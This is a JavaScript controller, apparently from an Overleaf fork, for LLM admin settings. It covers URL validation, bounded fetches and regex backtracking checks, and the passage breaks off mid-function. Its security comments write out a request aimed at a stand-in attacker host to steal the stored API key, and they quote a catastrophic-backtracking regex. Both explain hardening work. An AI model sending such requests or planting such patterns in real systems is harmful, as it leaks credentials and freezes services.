import logger from '@overleaf/logger'
import { promises as fs } from 'fs'
import path from 'path'
import { expressify } from '@overleaf/promise-utils'
import { encryptSecret, decryptSecret } from './LLMCrypto.mjs' // overleaf-lab: at-rest encryption of admin API key
import {
    DEFAULT_ASK_AI_SYSTEM_PROMPT,
    DEFAULT_ERROR_PROMPT,
    DEFAULT_REVIEW_SYSTEM_PROMPT,
    DEFAULT_COMPLETION_SYSTEM_PROMPT,
    DEFAULT_ASK_AI_ACTION_PROMPTS,
    mergeActionPrompts,
} from './LLMPrompts.mjs' // overleaf-lab: editable prompt defaults + merge helper

// Persist admin LLM settings in the same volume used by Overleaf data
const ADMIN_SETTINGS_PATH = process.env.LLM_ADMIN_SETTINGS_PATH ||
    '/var/lib/overleaf/data/llm-admin-settings.json'

// overleaf-lab: fallback for the review answer budget when the admin has not set one.
// Mirrors LLMComplianceController's REVIEW_MAX_TOKENS default (env override, else
// 12000). Duplicated here on purpose: importing it would make the two controllers
// import each other, since the compliance one already imports this module.
const DEFAULT_REVIEW_MAX_TOKENS =
    Number.parseInt(process.env.LLM_REVIEW_MAX_TOKENS, 10) > 0
        ? Number.parseInt(process.env.LLM_REVIEW_MAX_TOKENS, 10)
        : 12000

// overleaf-lab: how many review backends an install may declare, and how long each
// field of one may be. Mirrors MAX_REVIEW_ENDPOINTS in LLMComplianceController, which
// truncates the same list on the way in; both sides cap it because a settings file can
// also be written by hand, and the reader must not depend on the writer.
const MAX_REVIEW_ENDPOINTS = 8
const REVIEW_ENDPOINT_URL_MAX_CHARS = 500
const REVIEW_ENDPOINT_NAME_MAX_CHARS = 200

// overleaf-lab: does this regex backtrack catastrophically? A ladder of short
// pathological probes (a run of one letter, of digits, of spaces, of word-and-space,
// of the punctuation a LaTeX pattern is written around, each with and without a
// suffix that forces the match to FAIL, shortest first) under one wall-clock budget.
// An exponential pattern crosses the budget while the probes are still tiny; an
// honest one finishes the whole ladder in about a millisecond. See the same function
// in LLMComplianceController, which applies it when the patterns are LOADED.
//
// The ladder only proves what it tries: without the punctuation units a pattern whose
// blow-up is keyed on brackets or backslashes passes here and detonates on student
// LaTeX, which is made of exactly those characters.
//
// Duplicated on purpose, for the same reason DEFAULT_REVIEW_MAX_TOKENS above is:
// importing it would make the two controllers import each other, since the
// compliance one already imports this module. The pair is pinned by a test that
// slices both files and requires them to agree, so the copies cannot drift.
const SCAN_PATTERN_PROBE_BUDGET_MS = 40
const SCAN_PATTERN_PROBE_UNITS = ['a', '0', ' ', 'a ', '(', '\\', '[', '{', '\\a{']
const SCAN_PATTERN_PROBE_LENGTHS = [6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30]

function scanPatternIsTooSlow(regex) {
    const started = Date.now()
    for (const length of SCAN_PATTERN_PROBE_LENGTHS) {
        for (const unit of SCAN_PATTERN_PROBE_UNITS) {
            const run = unit.repeat(Math.ceil(length / unit.length)).slice(0, length)
            for (const probe of [run, `${run}!`]) {
                try {
                    regex.lastIndex = 0
                    regex.test(probe)
                } catch (err) {
                    return true
                }
                if (Date.now() - started > SCAN_PATTERN_PROBE_BUDGET_MS) {
                    return true
                }
            }
        }
    }
    return false
}

async function readAdminSettings() {
    try {
        const raw = await fs.readFile(ADMIN_SETTINGS_PATH, 'utf8')
        return JSON.parse(raw)
    } catch (err) {
        if (err.code === 'ENOENT') return {}
        logger.warn({ err, path: ADMIN_SETTINGS_PATH }, '[LLM] Could not read admin settings file')
        return {}
    }
}

async function writeAdminSettings(data) {
    try {
        await fs.mkdir(path.dirname(ADMIN_SETTINGS_PATH), { recursive: true })
        await fs.writeFile(ADMIN_SETTINGS_PATH, JSON.stringify(data, null, 2), 'utf8')
    } catch (err) {
        logger.error({ err, path: ADMIN_SETTINGS_PATH }, '[LLM] Could not write admin settings file')
        throw err
    }
}

// overleaf-lab: the shared LLM backend can be configured either via this admin
// settings JSON file OR via environment variables (LLM_API_URL / LLM_API_KEY /
// LLM_MODEL_NAME). The chat already falls back to env; expose the same fallback
// here so the admin page and the model scan reflect an env-only configuration
// instead of looking empty.
function envModelList() {
    const raw = process.env.LLM_AVAILABLE_MODELS || process.env.LLM_MODEL_NAME || ''
    return raw
        .split(',')
        .map(m => m.trim())
        .filter(m => m.length > 0)
}

// Effective settings for display: the JSON value, else the env fallback, plus
// flags telling the UI which values are inherited from the environment. The API
// key value is never returned, only whether one is set.
async function buildDisplaySettings() {
    const settings = await readAdminSettings()
    const envModels = envModelList()
    const jsonHasModels =
        Array.isArray(settings.allowedModels) && settings.allowedModels.length > 0
    return {
        systemPrompt: settings.systemPrompt || '',
        llmApiUrl: settings.llmApiUrl || process.env.LLM_API_URL || '',
        hasLlmApiKey: !!(settings.llmApiKey || process.env.LLM_API_KEY),
        allowedModels: jsonHasModels ? settings.allowedModels : envModels,
        completionModel: settings.completionModel || '',
        llmApiUrlFromEnv: !settings.llmApiUrl && !!process.env.LLM_API_URL,
        hasApiKeyFromEnv: !settings.llmApiKey && !!process.env.LLM_API_KEY,
        allowedModelsFromEnv: !jsonHasModels && envModels.length > 0,
        // overleaf-lab: document compliance review settings
        complianceRubrics: Array.isArray(settings.complianceRubrics) ? settings.complianceRubrics : [],
        reviewModel: settings.reviewModel || '',
        reviewModelBackup: settings.reviewModelBackup || '',
        // overleaf-lab: the review backend POOL. Absent or empty means the install has
        // one backend, configured the way it always was (llmApiUrl + reviewModel), and
        // the queue then behaves exactly as it did: one review at a time. Present, it
        // is the list of machines a review may run on, one review each.
        reviewEndpoints: Array.isArray(settings.reviewEndpoints) ? settings.reviewEndpoints : [],
        maxContextTokens: settings.maxContextTokens || 32000,
        reviewMaxTokens: settings.reviewMaxTokens || DEFAULT_REVIEW_MAX_TOKENS,
        // overleaf-lab: per-feature enable flags; absent field defaults to true so
        // existing installs keep every feature on.
        chatEnabled: settings.chatEnabled !== false,
        completionEnabled: settings.completionEnabled !== false,
        reviewEnabled: settings.reviewEnabled !== false,
        // overleaf-lab: editable prompt overrides. Send the STORED override only,
        // empty when there is none, and the pristine defaults separately (below) for
        // the page to show as a placeholder.
        //
        // This used to send the effective value (override, else the default text),
        // which quietly turned every admin into an override author: the page posts
        // its fields back on any save, so saving an unrelated setting stored a
        // verbatim copy of that day's default. The prompt then never received module
        // updates again, and a review kept running on a months-old prompt with no
        // sign of it anywhere. Empty means "follow the shipped default", and the
        // shipped default is the one that improves with the module.
        askAiSystemPrompt: settings.askAiSystemPrompt || '',
        errorPrompt: settings.errorPrompt || '',
        reviewSystemPrompt: settings.reviewSystemPrompt || '',
        completionSystemPrompt: settings.completionSystemPrompt || '',
        askAiActionPrompts:
            settings.askAiActionPrompts && typeof settings.askAiActionPrompts === 'object'
                ? settings.askAiActionPrompts
                : {},
        promptDefaults: {
            askAiSystemPrompt: DEFAULT_ASK_AI_SYSTEM_PROMPT,
            errorPrompt: DEFAULT_ERROR_PROMPT,
            reviewSystemPrompt: DEFAULT_REVIEW_SYSTEM_PROMPT,
            completionSystemPrompt: DEFAULT_COMPLETION_SYSTEM_PROMPT,
            askAiActionPrompts: DEFAULT_ASK_AI_ACTION_PROMPTS,
        },
    }
}

async function adminSettingsPage(req, res) {
    const pugPath = new URL('../../app/views/llm-admin-settings.pug', import.meta.url).pathname
    res.render(pugPath, await buildDisplaySettings())
}

// overleaf-lab: the compliance review has its own admin page. It reads the same
// settings document and saves through the same route: what changed is that the
// review settings are no longer buried at the bottom of the LLM page, which is
// about the chat and the completion.
async function complianceSettingsPage(req, res) {
    const pugPath = new URL('../../app/views/llm-compliance-settings.pug', import.meta.url).pathname
    res.render(pugPath, await buildDisplaySettings())
}

async function getAdminSettings(req, res) {
    res.json(await buildDisplaySettings())
}

async function saveAdminSettings(req, res) {
    const {
        systemPrompt,
        llmApiUrl,
        llmApiKey,
        allowedModels,
        completionModel,
        complianceRubrics,
        reviewModel,
        reviewModelBackup,
        reviewEndpoints,
        maxContextTokens,
        reviewMaxTokens,
        chatEnabled,
        completionEnabled,
        reviewEnabled,
        // overleaf-lab: editable prompt overrides.
        askAiSystemPrompt,
        errorPrompt,
        reviewSystemPrompt,
        completionSystemPrompt,
        askAiActionPrompts,
    } = req.body

    // overleaf-lab: systemPrompt used to be REQUIRED, which was fine while one page
    // posted every field at once. The compliance settings live on their own page
    // now and post only their own fields, so an absent systemPrompt has to mean
    // "leave it alone" rather than 400. Every other field already worked that way.
    if (systemPrompt !== undefined && typeof systemPrompt !== 'string') {
        return res.status(400).json({ error: 'systemPrompt must be a string' })
    }
    if (typeof systemPrompt === 'string' && systemPrompt.length > 4000) {
        return res.status(400).json({ error: 'systemPrompt must be 4000 characters or fewer' })
    }

    if (llmApiUrl && typeof llmApiUrl !== 'string') {
        return res.status(400).json({ error: 'llmApiUrl must be a string' })
    }
    if (llmApiKey && typeof llmApiKey !== 'string') {
        return res.status(400).json({ error: 'llmApiKey must be a string' })
    }
    if (allowedModels && !Array.isArray(allowedModels)) {
        return res.status(400).json({ error: 'allowedModels must be an array' })
    }

    // overleaf-lab: validate the document compliance review settings.
    if (complianceRubrics !== undefined && !Array.isArray(complianceRubrics)) {
        return res.status(400).json({ error: 'complianceRubrics must be an array' })
    }
    if (reviewModel !== undefined && typeof reviewModel !== 'string') {
        return res.status(400).json({ error: 'reviewModel must be a string' })
    }
    if (reviewModelBackup !== undefined && typeof reviewModelBackup !== 'string') {
        return res.status(400).json({ error: 'reviewModelBackup must be a string' })
    }
    if (reviewEndpoints !== undefined && !Array.isArray(reviewEndpoints)) {
        return res.status(400).json({ error: 'reviewEndpoints must be an array' })
    }

    // overleaf-lab: per-feature enable flags are optional booleans. When provided
    // they must be booleans; when omitted the existing value is preserved below.
    if (chatEnabled !== undefined && typeof chatEnabled !== 'boolean') {
        return res.status(400).json({ error: 'chatEnabled must be a boolean' })
    }
    if (completionEnabled !== undefined && typeof completionEnabled !== 'boolean') {
        return res.status(400).json({ error: 'completionEnabled must be a boolean' })
    }
    if (reviewEnabled !== undefined && typeof reviewEnabled !== 'boolean') {
        return res.status(400).json({ error: 'reviewEnabled must be a boolean' })
    }

    // overleaf-lab: editable prompt overrides. Each scalar prompt, when provided,
    // must be a string capped at 8000 chars. An empty string is allowed and means
    // "fall back to default" (buildDisplaySettings/getLLMPrompts use `|| DEFAULT`).
    if (askAiSystemPrompt !== undefined && typeof askAiSystemPrompt !== 'string') {
        return res.status(400).json({ error: 'askAiSystemPrompt must be a string' })
    }
    if (typeof askAiSystemPrompt === 'string' && askAiSystemPrompt.length > 8000) {
        return res.status(400).json({ error: 'askAiSystemPrompt must be 8000 characters or fewer' })
    }
    if (errorPrompt !== undefined && typeof errorPrompt !== 'string') {
        return res.status(400).json({ error: 'errorPrompt must be a string' })
    }
    if (typeof errorPrompt === 'string' && errorPrompt.length > 8000) {
        return res.status(400).json({ error: 'errorPrompt must be 8000 characters or fewer' })
    }
    if (reviewSystemPrompt !== undefined && typeof reviewSystemPrompt !== 'string') {
        return res.status(400).json({ error: 'reviewSystemPrompt must be a string' })
    }
    if (typeof reviewSystemPrompt === 'string' && reviewSystemPrompt.length > 8000) {
        return res.status(400).json({ error: 'reviewSystemPrompt must be 8000 characters or fewer' })
    }
    if (completionSystemPrompt !== undefined && typeof completionSystemPrompt !== 'string') {
        return res.status(400).json({ error: 'completionSystemPrompt must be a string' })
    }
    // overleaf-lab: kept short on purpose. This prompt is prefilled on every
    // keystroke that triggers a completion, so length here is latency for the user.
    if (typeof completionSystemPrompt === 'string' && completionSystemPrompt.length > 2000) {
        return res.status(400).json({ error: 'completionSystemPrompt must be 2000 characters or fewer' })
    }
    // overleaf-lab: action prompts, when provided, must be a plain (non-array) object.
    if (
        askAiActionPrompts !== undefined &&
        (typeof askAiActionPrompts !== 'object' ||
            askAiActionPrompts === null ||
            Array.isArray(askAiActionPrompts))
    ) {
        return res.status(400).json({ error: 'askAiActionPrompts must be an object' })
    }

    const existing = await readAdminSettings()

    // overleaf-lab: sanitize each rubric and cap the count. Entries without an id or
    // name are dropped; text fields are length-capped. When not provided, keep the
    // existing rubrics untouched.
    let sanitizedRubrics
    if (Array.isArray(complianceRubrics)) {
        sanitizedRubrics = complianceRubrics
            .map(r => ({
                id: String((r && r.id) || ''),
                name: String((r && r.name) || '').slice(0, 200),
                guidelines: String((r && r.guidelines) || '').slice(0, 20000),
                // overleaf-lab: per-rubric mechanical scans ("Label :: regex" per
                // line); policy lives with the rubric it verifies, never in code.
                scanPatterns: String((r && r.scanPatterns) || '').slice(0, 4000),
            }))
            .filter(r => r.id && r.name)
            .slice(0, 50)
    } else {
        sanitizedRubrics = Array.isArray(existing.complianceRubrics) ? existing.complianceRubrics : []
    }

    // overleaf-lab: sanitize the review backend pool.
    //
    // THE URL CHECK IS THE LOAD-BEARING PART. Every address in this list is fetched by
    // the review, unattended, with the instance's API key attached, because these are
    // addresses OUR OWN SETTINGS chose - that is the invariant the model scan and the
    // connection check are built around, and it only holds if what lands in the
    // settings file is an address and not something else. `fetch` will happily read a
    // data: URL, and in some builds a file: one, so the gate is here, at the single
    // point where an address enters the configuration, and it is the same isHttpUrl
    // the two outbound handlers below use.
    //
    // An entry with no url is dropped rather than refused: the admin page adds a blank
    // row on "add endpoint", and refusing the save would mean the page cannot be used.
    let sanitizedReviewEndpoints
    if (Array.isArray(reviewEndpoints)) {
        const cleaned = reviewEndpoints
            .map(e => ({
                id: String((e && e.id) || '').slice(0, 64),
                label: String((e && e.label) || '').slice(0, REVIEW_ENDPOINT_NAME_MAX_CHARS),
                url: String((e && e.url) || '').trim().slice(0, REVIEW_ENDPOINT_URL_MAX_CHARS),
                model: String((e && e.model) || '').trim().slice(0, REVIEW_ENDPOINT_NAME_MAX_CHARS),
                modelBackup: String((e && e.modelBackup) || '').trim().slice(0, REVIEW_ENDPOINT_NAME_MAX_CHARS),
            }))
            .filter(e => e.url.length > 0)
            .slice(0, MAX_REVIEW_ENDPOINTS)
        for (const endpoint of cleaned) {
            if (!isHttpUrl(endpoint.url)) {
                return res.status(400).json({
                    error: `Review endpoint URL must be an http:// or https:// URL: ${endpoint.url}`,
                })
            }
        }
        sanitizedReviewEndpoints = cleaned
    } else {
        sanitizedReviewEndpoints = Array.isArray(existing.reviewEndpoints)
            ? existing.reviewEndpoints
            : []
    }

    // overleaf-lab: clamp the context window to a sane range; keep existing (or the
    // 32000 default) when not provided.
    let sanitizedMaxContextTokens
    if (maxContextTokens !== undefined) {
        const parsed = parseInt(maxContextTokens, 10)
        sanitizedMaxContextTokens = Number.isNaN(parsed)
            ? existing.maxContextTokens || 32000
            : Math.min(1000000, Math.max(2000, parsed))
    } else {
        sanitizedMaxContextTokens = existing.maxContextTokens || 32000
    }

    // overleaf-lab: clamp the review answer budget. This is the model's max_tokens for
    // the report AND the room reserved for it in the context check, so it is bounded
    // well below any real context window.
    let sanitizedReviewMaxTokens
    if (reviewMaxTokens !== undefined) {
        const parsed = parseInt(reviewMaxTokens, 10)
        sanitizedReviewMaxTokens = Number.isNaN(parsed)
            ? existing.reviewMaxTokens || DEFAULT_REVIEW_MAX_TOKENS
            : Math.min(128000, Math.max(500, parsed))
    } else {
        sanitizedReviewMaxTokens = existing.reviewMaxTokens || DEFAULT_REVIEW_MAX_TOKENS
    }

    // overleaf-lab: validate each rubric's scan patterns ("Label :: regex" per line)
    // so the admin learns about a broken regex at save time, not from a silently
    // hint-less review. The reviewer side skips invalid lines anyway (defense in
    // depth for settings written by other means).
    //
    // COMPILING IS NOT ENOUGH. The pattern later runs, synchronously and inside an
    // HTTP request, over LaTeX any student can write, and JavaScript has no regex
    // timeout: `(\w+\s*)+ in Ingegneria`, a plausible way to write "a run of words,
    // then the degree name", took 67 seconds on 44 bytes of student text and freezes
    // the whole instance for as long as it runs. So the door is here, at save time,
    // where the cost is paid once by the person who can fix it.
    if (Array.isArray(complianceRubrics)) {
        for (const r of complianceRubrics) {
            const patternsText = r && typeof r.scanPatterns === 'string' ? r.scanPatterns : ''
            if (patternsText.length > 4000) {
                return res.status(400).json({
                    error: `Scan patterns of rubric "${(r && r.name) || '?'}" must be 4000 characters or fewer`,
                })
            }
            for (const rawLine of patternsText.split('\n')) {
                const line = rawLine.trim()
                if (!line) {
                    continue
                }
                const sep = line.indexOf('::')
                const body = (sep === -1 ? line : line.slice(sep + 2)).trim()
                if (!body) {
                    continue
                }
                let compiled
                try {
                    compiled = new RegExp(body, 'i')
                } catch (err) {
                    return res.status(400).json({
                        error: `Invalid scan pattern regex in rubric "${(r && r.name) || '?'}": ${body}`,
                    })
                }
                if (scanPatternIsTooSlow(compiled)) {
                    return res.status(400).json({
                        error:
                            `Scan pattern in rubric "${(r && r.name) || '?'}" takes too long on ordinary ` +
                            `text and would freeze the review, check for nested quantifiers: ${body}`,
                    })
                }
            }
        }
    }

    // overleaf-lab: sanitize the action prompt overrides. When provided, keep only
    // known keys with string values, each capped at 4000 chars. When not provided,
    // keep the existing object untouched.
    let sanitizedActionPrompts
    if (askAiActionPrompts !== undefined) {
        sanitizedActionPrompts = {}
        for (const key of Object.keys(DEFAULT_ASK_AI_ACTION_PROMPTS)) {
            const val = askAiActionPrompts[key]
            if (typeof val === 'string') {
                sanitizedActionPrompts[key] = val.slice(0, 4000)
            }
        }
    } else {
        sanitizedActionPrompts =
            existing.askAiActionPrompts &&
            typeof existing.askAiActionPrompts === 'object' &&
            !Array.isArray(existing.askAiActionPrompts)
                ? existing.askAiActionPrompts
                : {}
    }

    const updatedSettings = {
        ...existing,
        systemPrompt: typeof systemPrompt === 'string' ? systemPrompt : (existing.systemPrompt || ''),
        llmApiUrl: typeof llmApiUrl === 'string' ? llmApiUrl : (existing.llmApiUrl || ''),
        allowedModels: Array.isArray(allowedModels) ? allowedModels : existing.allowedModels || [],
        completionModel: typeof completionModel === 'string' ? completionModel : (existing.completionModel || ''),
        complianceRubrics: sanitizedRubrics,
        reviewModel: typeof reviewModel === 'string' ? reviewModel : (existing.reviewModel || ''),
        reviewModelBackup: typeof reviewModelBackup === 'string' ? reviewModelBackup : (existing.reviewModelBackup || ''),
        reviewEndpoints: sanitizedReviewEndpoints,
        maxContextTokens: sanitizedMaxContextTokens,
        reviewMaxTokens: sanitizedReviewMaxTokens,
        // overleaf-lab: omitted flag keeps the existing value (default true).
        chatEnabled: typeof chatEnabled === 'boolean' ? chatEnabled : (existing.chatEnabled !== false),
        completionEnabled: typeof completionEnabled === 'boolean' ? completionEnabled : (existing.completionEnabled !== false),
        reviewEnabled: typeof reviewEnabled === 'boolean' ? reviewEnabled : (existing.reviewEnabled !== false),
        // overleaf-lab: editable prompt overrides. An empty string is stored as-is
        // and later falls back to the default via `|| DEFAULT`.
        askAiSystemPrompt: typeof askAiSystemPrompt === 'string' ? askAiSystemPrompt : (existing.askAiSystemPrompt || ''),
        errorPrompt: typeof errorPrompt === 'string' ? errorPrompt : (existing.errorPrompt || ''),
        reviewSystemPrompt: typeof reviewSystemPrompt === 'string' ? reviewSystemPrompt : (existing.reviewSystemPrompt || ''),
        completionSystemPrompt: typeof completionSystemPrompt === 'string' ? completionSystemPrompt : (existing.completionSystemPrompt || ''),
        askAiActionPrompts: sanitizedActionPrompts,
    }

    if (typeof llmApiKey === 'string' && llmApiKey.trim().length > 0) {
        updatedSettings.llmApiKey = encryptSecret(llmApiKey.trim()) // overleaf-lab: encrypt admin key at rest
    }

    await writeAdminSettings(updatedSettings)
    logger.info({
        length: updatedSettings.systemPrompt.length,
        llmApiUrl: !!updatedSettings.llmApiUrl,
        hasLlmApiKey: !!updatedSettings.llmApiKey,
        allowedModels: updatedSettings.allowedModels?.length || 0,
    }, '[LLM] Admin settings updated')

    res.json({ success: true })
}

// Exported so LLMChatController can prepend the admin system prompt
export async function getSystemPrompt() {
    const settings = await readAdminSettings()
    return settings.systemPrompt || null
}

export async function getAdminLLMSettings() {
    const settings = await readAdminSettings()
    // overleaf-lab: fall back to env so the model scan / connection-check and the
    // chat share the same effective config (mirrors buildDisplaySettings above).
    const jsonHasModels =
        Array.isArray(settings.allowedModels) && settings.allowedModels.length > 0
    // overleaf-lab: the stored admin key is encrypted at rest; decrypt before use.
    // decryptSecret returns legacy plaintext (no enc:v1: prefix) unchanged.
    const jsonKey = settings.llmApiKey ? decryptSecret(settings.llmApiKey) : ''
    return {
        llmApiUrl: settings.llmApiUrl || process.env.LLM_API_URL || null,
        llmApiKey: jsonKey || process.env.LLM_API_KEY || null,
        allowedModels: jsonHasModels ? settings.allowedModels : envModelList(),
        completionModel: settings.completionModel || '',
        // overleaf-lab: document compliance review settings
        reviewModel: settings.reviewModel || '',
        reviewModelBackup: settings.reviewModelBackup || '',
        // overleaf-lab: the review backend pool, raw. The compliance controller is the
        // one place that decides what an empty or malformed list means (see
        // resolveReviewEndpoints), so this hands it over untouched rather than
        // inventing a second, subtly different default here.
        reviewEndpoints: Array.isArray(settings.reviewEndpoints) ? settings.reviewEndpoints : [],
        maxContextTokens: settings.maxContextTokens || 32000,
        reviewMaxTokens: settings.reviewMaxTokens || DEFAULT_REVIEW_MAX_TOKENS,
        // overleaf-lab: per-feature enable flags (absent field defaults to true).
        chatEnabled: settings.chatEnabled !== false,
        completionEnabled: settings.completionEnabled !== false,
        reviewEnabled: settings.reviewEnabled !== false,
    }
}

// overleaf-lab: per-feature enable flags for the chat, inline completion, and
// compliance review features. An absent field defaults to true so existing
// installs keep every feature on. Used for backend enforcement across the
// project-scoped controllers and the user settings page.
export async function getLLMFeatureFlags() {
    const s = await readAdminSettings()
    return {
        chatEnabled: s.chatEnabled !== false,
        completionEnabled: s.completionEnabled !== false,
        reviewEnabled: s.reviewEnabled !== false,
    }
}

// overleaf-lab: exposed so the compliance controller can load the configured
// rubrics (readAdminSettings already handles the missing-file case).
export async function getComplianceRubrics() {
    const settings = await readAdminSettings()
    return Array.isArray(settings.complianceRubrics) ? settings.complianceRubrics : []
}

// overleaf-lab: resolve the EFFECTIVE editable prompts (admin override when set,
// else the shipped default). Consumed by the compliance reviewer and the
// project-scoped GET /llm/prompts endpoint so the frontend and backend agree.
export async function getLLMPrompts() {
    const s = await readAdminSettings()
    return {
        askAiSystemPrompt: s.askAiSystemPrompt || DEFAULT_ASK_AI_SYSTEM_PROMPT,
        errorPrompt: s.errorPrompt || DEFAULT_ERROR_PROMPT,
        reviewSystemPrompt: s.reviewSystemPrompt || DEFAULT_REVIEW_SYSTEM_PROMPT,
        completionSystemPrompt: s.completionSystemPrompt || DEFAULT_COMPLETION_SYSTEM_PROMPT,
        askAiActionPrompts: mergeActionPrompts(s.askAiActionPrompts),
    }
}

// overleaf-lab: bounds for the outbound calls to the LLM backend.
//
// Both handlers below (the connection check and the model scan) reach an address
// that may be slow, hostile, or simply wrong, so both get the same three limits: a
// deadline, a cap on how much of the answer we buffer, and a refusal to speak
// anything that is not http(s). Without the first, a host that accepts the
// connection and never answers pins the handler open; without the second, that host
// decides how much memory we spend and how much text we echo back into the admin
// page; without the third, `fetch` happily reads a data: (and in some builds a
// file:) URL that arrived in a request.
const BACKEND_PROBE_TIMEOUT_MS = 30 * 1000
const BACKEND_PROBE_MAX_BYTES = 256 * 1024
// A model list is a few dozen ids; anything past this is not a backend answering.
const MODEL_SCAN_MAX_MODELS = 500

function isHttpUrl(value) {
    let parsed = null
    try {
        parsed = new URL(value)
    } catch (err) {
        return false
    }
    return parsed.protocol === 'http:' || parsed.protocol === 'https:'
}

// Read at most maxBytes of a response body. `response.text()` buffers whatever the
// far end decides to send, which is the wrong contract for an address we do not own.
// Always called, even when the body is discarded, so the transfer is drained or
// cancelled deterministically rather than left open.
async function readBoundedText(response, maxBytes) {
    const body = response.body
    if (!body || typeof body.getReader !== 'function') {
        // No stream (a mocked or already-buffered response): still bound the result.
        const text = await response.text()
        return text.length > maxBytes ? text.slice(0, maxBytes) : text
    }
    const reader = body.getReader()
    const decoder = new TextDecoder()
    let out = ''
    let read = 0
    try {
        while (read < maxBytes) {
            const { done, value } = await reader.read()
            if (done) {
                break
            }
            read += value.byteLength || value.length || 0
            out += decoder.decode(value, { stream: true })
        }
        out += decoder.decode()
    } finally {
        // Stop the transfer as soon as we have enough; the far end does not get to
        // decide how long we keep reading.
        try {
            await reader.cancel()
        } catch (err) {
            // The body may already be closed; nothing to do about it.
        }
    }
    return out.length > maxBytes ? out.slice(0, maxBytes) : out
}

// overleaf-lab: check that a backend answers a chat completion.
//
// SECURITY - one invariant, stated here and again on scanAdminModels below because
// it is the kind an innocent-looking edit undoes: the STORED admin API key travels
// ONLY to the address our own settings chose. This handler used to compute
// `apiKey || adminSettings.llmApiKey` against `apiUrl || adminSettings.llmApiUrl`,
// so a body carrying just {apiUrl: 'https://attacker.example'} delivered the
// instance's decrypted key there. Being a POST behind the CSRF middleware and
// ensureUserIsSuperAdmin made it far harder to reach than the GET next door, not
// impossible: any script running on this page (or any future caller that trusts its
// own inputs) had a one-request key read.
//
// Unlike the scan, this handler may still send a credential to a REQUESTED address,
// provided the credential came from the same request. The asymmetry is deliberate:
// the scan is a GET, carries no CSRF token and can be triggered by a link a
// super-admin merely clicks, so nothing in that request is trusted enough to carry
// a secret; this is a POST that cannot be forged, and validating a typed url+key
// pair BEFORE saving it is the entire purpose of the button (telling the admin to
// save first and test afterwards would mean storing an untested configuration). A
// key the caller typed teaches the caller nothing.
async function checkAdminLLMConnection(req, res) {
    const { apiUrl, apiKey } = req.body || {}
    const adminSettings = await getAdminLLMSettings()

    const requestedUrl = typeof apiUrl === 'string' ? apiUrl.trim() : ''
    const requestedKey = typeof apiKey === 'string' ? apiKey.trim() : ''
    // Who chose the address is what decides whether the stored key may go with it.
    const addressFromRequest = requestedUrl.length > 0

    const effectiveUrl = addressFromRequest ? requestedUrl : adminSettings.llmApiUrl
    const effectiveKey =
        requestedKey || (addressFromRequest ? '' : adminSettings.llmApiKey)

    // overleaf-lab: use first configured/allowed model instead of hardcoded 'qwen3-32b'
    const testModel =
        (adminSettings.allowedModels && adminSettings.allowedModels[0]) ||
        (process.env.LLM_MODEL_NAME || 'default').split(',')[0].trim()

    // overleaf-lab: only the URL is required. A local llama.cpp server has no
    // auth, so an empty key is valid; send Authorization only when a key exists.
    if (!effectiveUrl) {
        return res.status(400).json({
            success: false,
            error: 'LLM API URL is required',
        })
    }
    if (!isHttpUrl(effectiveUrl)) {
        return res.status(400).json({
            success: false,
            error: 'LLM API URL must be an http:// or https:// URL',
        })
    }

    const controller = new AbortController()
    const timeout = setTimeout(() => controller.abort(), BACKEND_PROBE_TIMEOUT_MS)

    try {
        const headers = { 'Content-Type': 'application/json' }
        if (typeof effectiveKey === 'string' && effectiveKey.length > 0) {
            headers.Authorization = `Bearer ${effectiveKey}`
        }
        const response = await fetch(`${effectiveUrl}/chat/completions`, {
            method: 'POST',
            headers,
            body: JSON.stringify({
                model: testModel,
                messages: [{ role: 'user', content: 'Test connection' }],
                max_tokens: 1,
            }),
            signal: controller.signal,
        })

        // Inside the try and before the timer is cleared on purpose: the deadline
        // has to cover the body, not just the response headers. Read on the success
        // path too, where the text is discarded, so the transfer never dangles.
        const body = await readBoundedText(response, BACKEND_PROBE_MAX_BYTES)

        if (!response.ok) {
            return res.status(400).json({
                success: false,
                error: 'LLM connection failed',
                status: response.status,
                details: body,
            })
        }

        res.json({ success: true, message: 'Connection successful' })
    } catch (err) {
        if (err && err.name === 'AbortError') {
            return res.status(504).json({
                success: false,
                error: 'Connection timeout',
            })
        }
        logger.error({ err }, '[LLM] Admin connection check failed')
        res.status(500).json({ success: false, error: 'Connection attempt failed' })
    } finally {
        clearTimeout(timeout)
    }
}

// overleaf-lab: list the model ids the backend exposes.
//
// SECURITY - why the address and the credential are resolved together, and never
// from the same request. This is a GET, so Express's CSRF middleware does not cover
// it, and Overleaf's session cookie is SameSite=Lax, which means ONE link followed
// by a logged-in super-admin is enough to run this handler. The previous version
// took `apiUrl` from the query string and, when `apiKey` was omitted, fell back to
// the STORED, DECRYPTED admin key:
//
//     GET /admin/llm/models?apiUrl=https://attacker.example/x
//
// in an email to a named administrator delivered `Authorization: Bearer <the
// instance's LLM key>` straight into somebody else's access log. Being behind
// ensureUserIsSuperAdmin did not help: the whole point of the attack is that the
// super-admin makes the request.
//
// Both legitimate uses survive, split by who chose the address:
//   - no `apiUrl` in the request -> scan the CONFIGURED backend with the stored key.
//     The address comes from our own settings, so the credential may travel to it.
//   - `apiUrl` in the request -> probe THAT address with NO Authorization header at
//     all. This is the admin page checking a URL that has been typed but not saved
//     yet, and it is all a keyless local server (llama.cpp) ever needed. A crafted
//     link therefore learns nothing it did not already know.
// The query `apiKey` is gone entirely: a key in a URL ends up in access logs, in
// browser history, and in the Referer of whatever the page loads next. That is also
// why this handler is stricter than checkAdminLLMConnection above, which may still
// send a key the same request carried: a POST cannot be produced by a link.
async function scanAdminModels(req, res) {
    const requestedUrl =
        typeof req.query.apiUrl === 'string' ? req.query.apiUrl.trim() : ''
    // The caller chose the address -> the request is a credential-free probe.
    const isProbe = requestedUrl.length > 0

    let llmApiUrl = requestedUrl
    let llmApiKey = null
    if (!isProbe) {
        const adminSettings = await getAdminLLMSettings()
        llmApiUrl = adminSettings.llmApiUrl
        llmApiKey = adminSettings.llmApiKey
    }

    if (!llmApiUrl) {
        return res.status(400).json({
            success: false,
            error: 'Admin LLM API URL must be configured first',
        })
    }

    if (!isHttpUrl(llmApiUrl)) {
        return res.status(400).json({
            success: false,
            error: 'LLM API URL must be an http:// or https:// URL',
        })
    }

    const controller = new AbortController()
    const timeout = setTimeout(() => controller.abort(), BACKEND_PROBE_TIMEOUT_MS)

    try {
        const headers = {}
        // overleaf-lab: the stored key is attached to the configured address only.
        // `isProbe` is the whole guard; do not weaken it into "send the key when we
        // happen to have one".
        if (!isProbe && typeof llmApiKey === 'string' && llmApiKey.length > 0) {
